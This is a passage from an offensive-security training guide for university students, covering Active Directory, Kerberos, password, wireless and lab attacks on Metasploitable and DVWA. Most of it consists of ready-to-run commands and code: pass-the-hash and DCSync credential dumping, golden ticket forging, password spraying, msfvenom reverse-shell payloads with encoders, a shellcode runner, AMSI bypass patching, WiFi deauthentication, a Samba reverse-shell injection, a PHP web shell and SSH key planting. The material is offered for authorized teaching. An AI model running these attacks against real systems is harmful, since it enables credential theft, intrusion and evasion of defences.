crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH_HERE'  # Whole subnet

# Evil-WinRM (WinRM port 5985)
evil-winrm -i TARGET_IP -u Administrator -H 'NTLM_HASH'

# Impacket tools
impacket-psexec DOMAIN/Administrator@TARGET_IP -hashes :NTLM_HASH
impacket-wmiexec DOMAIN/Administrator@TARGET_IP -hashes :NTLM_HASH
impacket-smbexec DOMAIN/Administrator@TARGET_IP -hashes :NTLM_HASH

# Metasploit
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE  # LM:NTLM
set RHOSTS TARGET_IP
run
```

### 17.2 Kerberos Attacks

```bash
# ─── Kerberoasting ─────────────────────────────────────────────
# Request TGS tickets for service accounts → crack offline

# Using Impacket (from Linux)
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request -output kerberoast_hashes.txt

# Crack with hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# PowerShell (from Windows domain machine)
# Rubeus:
.\Rubeus.exe kerberoast /output:hashes.txt

# ─── AS-REP Roasting ───────────────────────────────────────────
# Targets accounts with "Do not require Kerberos preauthentication"

# From Linux
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt
impacket-GetNPUsers DOMAIN/user:password -dc-ip DC_IP -request

# From Windows (Rubeus)
.\Rubeus.exe asreproast /output:asrep_hashes.txt

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# ─── Pass-the-Ticket ───────────────────────────────────────────
# Steal Kerberos tickets from memory and reuse them

# Export tickets (Mimikatz)
kerberos::list /export

# Import ticket (Mimikatz)
kerberos::ptt ticket.kirbi

# From Linux (impacket)
impacket-ticketer -nthash NTLM_HASH -domain-sid DOMAIN_SID -domain DOMAIN username
export KRB5CCNAME=username.ccache
impacket-psexec DOMAIN/username@TARGET -k -no-pass

# ─── Golden Ticket ─────────────────────────────────────────────
# Forge TGTs using krbtgt hash — unlimited domain access!

# Get krbtgt hash (Mimikatz, requires DC access)
lsadump::dcsync /domain:DOMAIN /user:krbtgt

# Create Golden Ticket (Mimikatz)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM_HASH /id:500
kerberos::ptt golden.kirbi

# ─── DCSync ────────────────────────────────────────────────────
# Replicate DC data including all password hashes
# Requires Domain Admin or replication rights

# Mimikatz
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv

# Impacket (from Linux)
impacket-secretsdump DOMAIN/Administrator:password@DC_IP -just-dc-ntlm
impacket-secretsdump DOMAIN/Administrator:password@DC_IP -just-dc
```

---

## 18. Active Directory Attacks

### 18.1 BloodHound — AD Attack Path Mapping

```bash
# BloodHound reveals attack paths to Domain Admin

# Setup
sudo apt install bloodhound neo4j -y
sudo neo4j start
bloodhound &
# Browser: http://localhost:7474 (neo4j setup)
# Default neo4j: neo4j/neo4j — change on first login

# Collect data (from Linux with domain credentials)
bloodhound-python -d DOMAIN.LOCAL -u user -p password -ns DC_IP -c All
# Creates JSON files: computers.json, users.json, groups.json, etc.

# Collect data (from Windows — Sharphound)
.\SharpHound.exe -c All --zipfilename bloodhound.zip
# or PowerShell:
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Import to BloodHound GUI
# Drag and drop JSON/zip files into BloodHound

# Key queries in BloodHound:
# "Find all Domain Admins"
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Shortest Paths from Owned Principals"
# "Find Computers where Domain Users are Local Admins"
# "Kerberoastable Users"
# "AS-REP Roastable Users"
```

### 18.2 Active Directory Enumeration

```powershell
# ─── PowerView (PowerShell AD Enumeration) ─────────────────────

# Load PowerView
. .\PowerView.ps1
# Or: Import-Module .\PowerView.ps1

# Domain info
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy

# User enumeration
Get-NetUser | Select-Object samaccountname, description, lastlogon, pwdlastset
Get-NetUser -SPN  # Kerberoastable users
Get-NetUser -PreauthNotRequired  # AS-REP roastable

# Group enumeration
Get-NetGroup
Get-NetGroupMember "Domain Admins"
Get-NetGroupMember "Enterprise Admins"

# Computer enumeration
Get-NetComputer | Select-Object dnshostname, operatingsystem
Get-NetComputer -OperatingSystem "*Server 2019*"

# Find logged-in users (noisy!)
Get-NetLoggedon -ComputerName target_machine
Get-NetSession -ComputerName target_machine

# Find local admin rights
Find-LocalAdminAccess  # Where are we local admin?

# Enumerate GPO
Get-NetGPO
Get-NetGPO | Select-Object displayname, whenchanged

# ACL hunting
Find-InterestingDomainAcl  # Find interesting ACL edges
Invoke-ACLScanner  # Full ACL scan
```

---

## 19. Password Attacks

### 19.1 Online Brute Force

```bash
# ─── Hydra — Network Protocol Brute Force ─────────────────────

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt ssh://TARGET_IP -t 4

# FTP brute force
hydra -l admin -P rockyou.txt ftp://TARGET_IP

# HTTP form (POST)
hydra -l admin -P rockyou.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid password" -V

# HTTP Basic Auth
hydra -l admin -P rockyou.txt TARGET_IP http-get /admin

# RDP brute force
hydra -l Administrator -P rockyou.txt rdp://TARGET_IP

# SMB brute force
hydra -l Administrator -P rockyou.txt smb://TARGET_IP

# ─── Medusa ────────────────────────────────────────────────────

medusa -h TARGET_IP -u admin -P rockyou.txt -M ssh
medusa -h TARGET_IP -u admin -P rockyou.txt -M ftp

# ─── Spray attacks (low and slow) ─────────────────────────────

# Password spraying (one password, many users)
# Avoids account lockout by spraying slowly
crackmapexec smb DC_IP -u users.txt -p "Password123" --continue-on-success
crackmapexec smb DC_IP -u users.txt -p "Welcome1" --continue-on-success

# Spray via Kerbrute (Kerberos, very fast, no lockout if done right)
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC_IP users.txt "Password123"
```

### 19.2 Offline Cracking

```bash
# ─── Extract Hashes ────────────────────────────────────────────

# Linux /etc/shadow
sudo unshadow /etc/passwd /etc/shadow > hashes_to_crack.txt

# Windows SAM (offline — boot from live USB or VSS)
impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv -security SECURITY.hiv LOCAL

# Windows SAM (live — requires admin)
impacket-secretsdump DOMAIN/Admin:password@TARGET_IP

# Windows NTDS.dit (Domain Controller — ALL domain hashes!)
impacket-secretsdump DOMAIN/Admin:password@DC_IP -just-dc-ntlm

# From Meterpreter
load kiwi
creds_all
hashdump

# ─── Create Custom Wordlists ───────────────────────────────────

# CeWL — generate wordlist from website content
cewl https://target.com -m 6 -w wordlist.txt
cewl https://target.com -m 6 --email -w wordlist.txt

# Crunch — generate brute force wordlists
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt
crunch 8 8 -t Company@@@@ -o company_wordlist.txt  # Company pattern

# Hashcat rules to mutate wordlists
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule rockyou.txt > mutated_words.txt

# Combine for maximum effectiveness
cat rockyou.txt company_words.txt cewl_words.txt | sort -u > combined.txt
hashcat -m 1000 ntlm_hashes.txt combined.txt -r rules/best64.rule
```

---

## 20. Malware & Payload Development Concepts

### 20.1 Payload Types

```
Payload Categories:

1. Staged Payloads:
   Stager (small) → downloads → Stage (large, feature-rich)
   Example: windows/x64/meterpreter/reverse_tcp
   Stager connects, downloads meterpreter DLL

2. Stageless Payloads:
   Self-contained, all code in one binary
   Example: windows/x64/meterpreter_reverse_tcp
   Larger file size but no second connection needed

3. Shellcode:
   Raw machine code bytes
   Injected into processes
   Position-independent code (PIC)

4. Droppers:
   Download and execute payload from URL
   Malicious macro → downloads exe from C2 → executes

5. Loaders:
   Load shellcode or DLL into memory
   Avoid writing to disk (fileless)

6. Fileless Malware:
   Lives entirely in memory / registry
   PowerShell, WMI, LOLBins (Living off the Land Binaries)
```

```bash
# ─── Payload Generation with msfvenom ─────────────────────────

# List all payloads
msfvenom --list payloads | grep "windows/x64"
msfvenom --list formats   # Output formats

# Encode payload (basic AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.10.10 LPORT=4444 \
    -e x64/xor_dynamic \  # Encoder
    -i 10 \               # Iterations
    -f exe -o encoded.exe

# Multiple encodings
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.10.10 LPORT=4444 \
    -e x64/xor -i 5 \
    -e x64/zutto_dekiru -i 3 \
    -f raw | msfvenom -a x64 --platform win -e x64/xor -i 5 -f exe -o multi.exe

# Generate C shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f c

# Python shellcode runner
python3 -c "
import ctypes, base64
shellcode_b64 = 'BASE64_SHELLCODE_HERE'
shellcode = base64.b64decode(shellcode_b64)
buf = ctypes.create_string_buffer(shellcode)
addr = ctypes.addressof(buf)
ctypes.windll.kernel32.VirtualProtect(addr, len(shellcode), 0x40, ctypes.byref(ctypes.c_ulong(0)))
handle = ctypes.windll.kernel32.CreateThread(0, 0, addr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
"
```

---

## 21. Antivirus Evasion Concepts

### 21.1 AV Evasion Techniques

```
AV Detection Methods:
1. Signature-based — match known bad code patterns
2. Heuristic — analyze code behavior
3. Behavioral — runtime monitoring
4. Machine learning — AI-based detection

Evasion Techniques:
1. Encoding/Obfuscation — change code appearance
2. Encryption — encrypt payload, decrypt at runtime
3. Packing — compress executable
4. Process injection — inject code into legitimate process
5. LOLBins — use Windows own tools for malicious purposes
6. Fileless — run from memory, no files on disk
7. Anti-analysis — detect sandbox/VM, delay execution
8. AMSI bypass — disable PowerShell's scan interface
9. ETW bypass — disable Event Tracing for Windows
```

```powershell
# ─── AMSI Bypass (PowerShell) ─────────────────────────────────
# AMSI = Antimalware Scan Interface
# PowerShell passes scripts to AMSI before running

# Classic bypass (many variants, often detected now)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Patching AmsiScanBuffer in memory
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32
$loadLibrary = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($loadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)

# ─── Obfuscation (PowerShell) ─────────────────────────────────

# Use Invoke-Obfuscation or ISE-Steroids
Install-Module -Name Invoke-Obfuscation
Import-Module Invoke-Obfuscation
Invoke-Obfuscation  # Interactive menu

# Manual obfuscation techniques
# String concatenation:
$cmd = 'Inv' + 'oke-' + 'Mimik' + 'atz'

# Base64 encoding:
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
powershell -enc $encoded

# Variable substitution:
$a = 'wh'; $b = 'oami'; Invoke-Expression "$a$b"

# ─── Process Injection (C#) ────────────────────────────────────
# Inject shellcode into a legitimate process
# This is advanced — educational overview only

/*
Classic process injection:
1. OpenProcess() — get handle to target process
2. VirtualAllocEx() — allocate memory in target
3. WriteProcessMemory() — write shellcode to allocated memory
4. CreateRemoteThread() — execute shellcode in target process
*/
```

---

## 22. Wireless Security

### 22.1 WiFi Hacking (Test Your Own Networks Only)

```bash
# ─── Setup ─────────────────────────────────────────────────────

# Enable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# Or:
sudo airmon-ng start wlan0

# ─── Capture WPA2 Handshake ────────────────────────────────────

# Scan for networks
sudo airodump-ng wlan0mon

# Capture specific network
sudo airodump-ng -c CHANNEL --bssid TARGET_BSSID -w handshake_capture wlan0mon

# Deauthenticate clients to force reconnect (captures handshake)
sudo aireplay-ng -0 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
# (Do NOT use on networks you don't own!)

# Crack WPA2 handshake
aircrack-ng handshake_capture.cap -w /usr/share/wordlists/rockyou.txt

# Hashcat cracking (faster with GPU)
# Convert cap to hashcat format
hcxpcaptool -o capture.hccapx handshake_capture.cap
hashcat -m 22000 capture.hccapx rockyou.txt

# ─── PMKID Attack (no client needed) ──────────────────────────

hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcaptool -z pmkid.txt capture.pcapng
hashcat -m 22801 pmkid.txt rockyou.txt

# ─── Evil Twin / Rogue AP ─────────────────────────────────────

# hostapd-wpe creates fake AP
sudo apt install hostapd-wpe -y
# Configure /etc/hostapd-wpe/hostapd-wpe.conf
# Set SSID to match target network
# Captures credentials when users connect

# ─── WPS Attack ────────────────────────────────────────────────

# WPS PIN brute force (Pixie Dust attack)
sudo reaver -i wlan0mon -b TARGET_BSSID -vvv
sudo reaver -i wlan0mon -b TARGET_BSSID -K 1  # Pixie Dust

# ─── WEP Cracking (ancient, educational only) ─────────────────

# WEP is completely broken, never use it
sudo airodump-ng -c CHANNEL --bssid BSSID -w wep_capture wlan0mon
sudo aireplay-ng -3 -b BSSID -h OWN_MAC wlan0mon  # ARP replay
sudo aircrack-ng wep_capture.cap  # Crack with enough IVs
```

---

## 23. Practical Labs — Your Own Web Apps

### 23.1 Setting Up Your Web App Testing Environment

```bash
# ─── DVWA (Damn Vulnerable Web Application) ────────────────────

# Install on Ubuntu VM
sudo apt install apache2 mysql-server php php-mysqli php-gd -y
git clone https://github.com/digininja/DVWA /var/www/html/dvwa
cd /var/www/html/dvwa/config
cp config.inc.php.dist config.inc.php
nano config.inc.php
# Set: $_DVWA['db_password'] = 'your_password';

sudo service apache2 start
sudo service mysql start

# MySQL setup
sudo mysql -u root -e "CREATE DATABASE dvwa; CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd'; GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';"

# Browse to: http://localhost/dvwa/setup.php
# Click "Create / Reset Database"
# Login: admin / password

# ─── bWAPP (Buggy Web App) ─────────────────────────────────────

# Already set up in your lab (see environment setup)
# Browse to: http://172.16.100.60/bwapp

# ─── Test Your OWN Web Apps ────────────────────────────────────

# As a software engineer, you have created web apps.
# Set up a testing checklist:
```

### 23.2 Testing Your Own Web Applications — Methodology

```
Web Application Penetration Testing Methodology:

Phase 1: Reconnaissance
□ Identify all pages and endpoints
□ Map out the application (spider/crawl)
□ Identify technologies used
□ Check robots.txt, sitemap.xml
□ Enumerate subdomains

Phase 2: Authentication Testing
□ Default credentials
□ Password policy (brute force possible?)
□ Account lockout mechanism
□ Session token analysis (predictable?)
□ Cookie security flags (HttpOnly, Secure, SameSite)
□ Password reset flow
□ Multi-factor authentication bypass

Phase 3: Authorization Testing
□ Horizontal privilege escalation (access other users' data)
□ Vertical privilege escalation (access admin functions)
□ IDOR (Insecure Direct Object Reference)
□ Force browsing to protected pages

Phase 4: Input Validation Testing
□ SQL Injection on all input fields
□ XSS (reflected, stored, DOM)
□ Command injection
□ LDAP injection
□ XML/XXE injection
□ File upload bypass
□ Path traversal

Phase 5: Session Management
□ Session fixation
□ Session hijacking via XSS
□ CSRF (Cross-Site Request Forgery)

Phase 6: Business Logic
□ Negative price/quantity
□ Skip workflow steps
□ Race conditions
□ Mass assignment
```

```bash
# ─── Testing Your Own PHP/Laravel/Node.js App ──────────────────

# 1. Set security headers check
curl -I https://your-app.com | grep -i "X-Frame-Options\|X-XSS-Protection\|Content-Security-Policy\|Strict-Transport-Security"

# 2. Check for information disclosure
curl -I https://your-app.com | grep -i "server\|x-powered-by"

# 3. Check cookies
curl -v https://your-app.com 2>&1 | grep -i "set-cookie"

# 4. Directory brute force
gobuster dir -u http://your-app.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,js,json

# 5. SQLi testing
sqlmap -u "http://your-app.com/search?q=test" --dbs --batch

# 6. XSS testing with XSSer
xsser -u "http://your-app.com/search?q=" -g

# 7. OWASP ZAP automated scan
# Download from: zaproxy.org
# Run automated active scan against your app

# 8. API testing (if you have a REST API)
# Use Postman or curl for manual testing

# Test for IDOR
curl http://your-app.com/api/user/1 -H "Cookie: session=YOUR_SESSION"
curl http://your-app.com/api/user/2 -H "Cookie: session=YOUR_SESSION"
# If you can access user 2's data being user 1 → IDOR!

# Test for CSRF
# Create HTML page:
cat > csrf_test.html << 'EOF'
<html>
<body>
<form action="http://your-app.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Click me!">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
EOF
# Open this page while logged into your app
# If email changes → CSRF vulnerability!
```

---

## 24. Practical Labs — Metasploitable 2

### 24.1 Metasploitable 2 — Complete Attack Guide

```bash
# Metasploitable 2 IP: 172.16.100.50 (or check with: arp-scan -l)

# ─── Initial Nmap Scan ─────────────────────────────────────────
nmap -sV -sC -p- 172.16.100.50 -oA metasploitable2_scan

# Expected open ports:
# 21  - FTP (vsftpd 2.3.4 - BACKDOOR!)
# 22  - SSH (OpenSSH 4.7p1)
# 23  - Telnet
# 25  - SMTP
# 53  - DNS
# 80  - HTTP (Apache 2.2.8)
# 111 - RPC
# 139 - NetBIOS
# 445 - SMB (Samba 3.0.20)
# 512 - rexec
# 513 - rlogin
# 514 - rsh
# 1099 - Java RMI
# 1524 - ingreslock BACKDOOR!
# 2049 - NFS
# 2121 - FTP (ProFTPD)
# 3306 - MySQL
# 5432 - PostgreSQL
# 5900 - VNC
# 6000 - X11
# 6667 - IRC (Unreal IRCd - BACKDOOR!)
# 8009 - AJP13
# 8180 - HTTP (Tomcat)
```

**Lab 1: FTP vsftpd 2.3.4 Backdoor**

```bash
# vsftpd 2.3.4 has a backdoor: send :) in username → opens shell on port 6200

# Manual exploitation:
echo "USER user:)" | nc -w 1 172.16.100.50 21
nc 172.16.100.50 6200

# Metasploit:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.16.100.50
run
# Should get root shell!
```

**Lab 2: Samba usermap_script**

```bash
# Samba 3.0.20 — username map script command injection

# Metasploit:
use exploit/multi/samba/usermap_script
set RHOSTS 172.16.100.50
set LHOST YOUR_IP
run

# Manual (using smbclient):
smbclient //172.16.100.50/tmp -N
# Enter username: /=`nohup nc -e /bin/sh YOUR_IP 4444`
```

**Lab 3: UnrealIRCd Backdoor**

```bash
# UnrealIRCd 3.2.8.1 backdoor — AB command triggers shell

# Metasploit:
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 172.16.100.50
set LHOST YOUR_IP
run
```

**Lab 4: Java RMI**

```bash
# Java RMI (port 1099) — code execution
use exploit/multi/misc/java_rmi_server
set RHOSTS 172.16.100.50
set LHOST YOUR_IP
run
```

**Lab 5: Tomcat Manager (port 8180)**

```bash
# Apache Tomcat Manager - default credentials
# Try: admin/admin, tomcat/tomcat, manager/manager

# Browser: http://172.16.100.50:8180/manager/html

# Metasploit (after finding valid creds):
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 172.16.100.50
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST YOUR_IP
run
```

**Lab 6: distcc**

```bash
# distcc (port 3632) — distributed compiler with RCE
use exploit/unix/misc/distcc_exec
set RHOSTS 172.16.100.50
set LHOST YOUR_IP
run
```

**Lab 7: PostgreSQL**

```bash
# PostgreSQL (port 5432) — default postgres/postgres
use exploit/linux/postgres/postgres_payload
set RHOSTS 172.16.100.50
set PASSWORD postgres
set LHOST YOUR_IP
run
```

**Lab 8: NFS Mount**

```bash
# NFS (port 2049) — check for exported shares
showmount -e 172.16.100.50
# If /  is exported to everyone:
sudo mkdir /mnt/metasploitable
sudo mount -t nfs 172.16.100.50:/ /mnt/metasploitable
ls /mnt/metasploitable
cat /mnt/metasploitable/etc/shadow   # All password hashes!
cat /mnt/metasploitable/root/.ssh/authorized_keys
# Add your SSH key:
echo "YOUR_PUBLIC_KEY" >> /mnt/metasploitable/root/.ssh/authorized_keys
ssh root@172.16.100.50
```

**Lab 9: Web Application (DVWA on Metasploitable)**

```bash
# DVWA runs on http://172.16.100.50/dvwa/
# Default: admin / password

# SQLi on DVWA (LOW security):
# Browse to: SQL Injection page
# Enter: ' OR '1'='1
# Or use sqlmap:
sqlmap -u "http://172.16.100.50/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=YOUR_SESSION;security=low" \
    --dbs

# Command Injection (LOW security):
# Enter: 127.0.0.1; id
# Or: 127.0.0.1 | cat /etc/passwd

# File Inclusion (LOW security):
# URL: http://172.16.100.50/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd

# File Upload:
# Create PHP shell and upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload and access:
curl "http://172.16.100.50/dvwa/hackable/uploads/shell.php?cmd=id"
```

---

## 25. Reporting & Documentation

### 25.1 Penetration Test Report Template

````markdown
# Penetration Test Report

**Classification:** CONFIDENTIAL
**Date:** [Date]
**Target:** [System/Application Name]
**Tester:** [Your Name]

---

## Executive Summary

[Brief non-technical overview of findings for management]

Overall Risk Level: HIGH / MEDIUM / LOW

Key Findings:

1. [Critical: RCE via SQLi on login page]
2. [High: Outdated Apache with known CVE]
3. [Medium: Weak password policy]

---

## Technical Findings

### Finding 1: SQL Injection on Login Form

**Severity:** Critical
**CVSS Score:** 9.8
**CVE:** N/A

**Description:**
The login endpoint /api/login is vulnerable to SQL injection...

**Evidence:**
Payload: ' OR '1'='1'--
Response: [screenshot/output]

**Impact:**
Authentication bypass, full database access, potential RCE...

**Remediation:**
Use parameterized queries / prepared statements:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```
````

**References:**

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection

---

## Risk Matrix

| Severity | Count | Examples                         |
| -------- | ----- | -------------------------------- |
| Critical | 1     | SQLi                             |
| High     | 2     | XXE, RCE                         |
| Medium   | 3     | XSS, CSRF, Open Redirect         |
| Low      | 5     | Info Disclosure, Missing Headers |
| Info     | 3     | SSL Config, Cookie Issues        |

---

## Remediation Priority

1. [IMMEDIATE] Fix SQL injection
2. [THIS WEEK] Patch Apache
3. [THIS MONTH] Implement security headers

```

---

## 26. Certifications Roadmap

```

Beginner → Intermediate → Advanced

Beginner:
├── CompTIA Security+ (foundational)
├── CEH - Certified Ethical Hacker
└── eJPT - eLearnSecurity Junior Penetration Tester

Intermediate:
├── OSCP - Offensive Security Certified Professional ← GOLD STANDARD
├── PNPT - Practical Network Penetration Tester (TCM Security)
└── HTB CPTS - HackTheBox Certified Penetration Testing Specialist

Advanced:
├── OSED - Offensive Security Exploit Developer
├── OSEP - Offensive Security Experienced Penetration Tester
├── CRTO - Certified Red Team Operator
└── GPEN / GXPN (SANS/GIAC)

Specialized:
├── BSCP - Burp Suite Certified Practitioner (web focus)
├── eWPT - Web Application Penetration Tester
└── CRTP - Certified Red Team Professional (AD focus)

Practice Platforms:
├── HackTheBox (htb.com)
├── TryHackMe (tryhackme.com)
├── VulnHub (vulnhub.com)
├── PortSwigger Web Academy (portswigger.net/web-security) ← FREE, EXCELLENT
└── PentesterLab (pentesterlab.com)

````

---

## 27. Quick Reference Cheat Sheets

### 27.1 Linux Commands Cheat Sheet

```bash
# File Operations
ls -la                   # List all with details
cat file.txt             # Print file
less file.txt            # Page through file
head -n 20 file.txt     # First 20 lines
tail -n 20 file.txt     # Last 20 lines
tail -f /var/log/syslog  # Follow log file
grep "pattern" file      # Search in file
grep -r "pattern" dir/   # Recursive search
find / -name "*.php"     # Find files
locate filename          # Find (from database)
wc -l file.txt           # Count lines

# Network
ip a                     # IP addresses
ip route                 # Routing table
ss -tulpn                # Open ports
curl http://url          # HTTP request
wget http://url          # Download file
nc -lvnp 4444            # Listen on port
nc target 4444           # Connect to port
ping -c 4 host           # Ping
traceroute host          # Trace route

# Processes
ps aux                   # All processes
kill -9 PID             # Force kill
pkill -9 process_name    # Kill by name
jobs                     # Background jobs
bg                       # Resume in background
fg                       # Resume in foreground

# Privileges
sudo command             # Run as root
sudo -u user command     # Run as user
sudo -l                  # List sudo permissions
su username              # Switch user
su -                     # Switch to root
id                       # Current user info
````

### 27.2 Windows Commands Cheat Sheet

```powershell
# System Info
systeminfo
whoami /all
hostname
ipconfig /all
netstat -ano

# Users & Groups
net user
net localgroup
net localgroup administrators
net user username /domain

# Files
dir /s /b *.txt
findstr /s /i "password" *.*
type file.txt
copy src dst
move src dst
del file.txt
mkdir directory

# Processes
tasklist
taskkill /PID 1234 /F
Get-Process

# Services
sc query
sc start servicename
sc stop servicename
net start/stop servicename

# Registry
reg query HKLM\SOFTWARE
reg add KEY /v name /t REG_SZ /d value
reg delete KEY /v name /f
reg export KEY file.reg
```

### 27.3 Metasploit Cheat Sheet

```bash
msfconsole                     # Start MSF
search module_name             # Search modules
use module/path                # Load module
info                           # Module info
show options                   # Required options
show payloads                  # Available payloads
set OPTION value               # Set option
setg OPTION value              # Set global option
run / exploit                  # Execute

# Meterpreter
sysinfo                        # System info
getuid                         # Current user
getsystem                      # Privesc attempt
hashdump                       # Dump hashes
upload file remote_path        # Upload
download remote_path           # Download
shell                          # OS shell
background                     # Background session
sessions -l                    # List sessions
sessions -i 1                  # Interact session 1
```

### 27.4 SQL Injection Quick Reference

```sql
-- Test
'  ''  `  --  #  /**/

-- Column count
' ORDER BY 1--
' ORDER BY 2--

-- Find displayable columns
' UNION SELECT null,null,null--

-- Get info (MySQL)
' UNION SELECT version(),database(),user()--

-- Get tables
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()--

-- Get columns
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--

-- Get data
' UNION SELECT username,password FROM users--

-- Time-based blind (MySQL)
' AND SLEEP(5)--

-- Boolean blind
' AND 1=1--  (true)
' AND 1=2--  (false)
```

---

_This guide is for educational and authorized testing purposes only._
_Always obtain written permission before testing any system._
_University students: Check with your lab coordinator for approved testing targets._

**Version:** 1.0 | **Audience:** Cybersecurity University Students | **Level:** Beginner to Intermediate
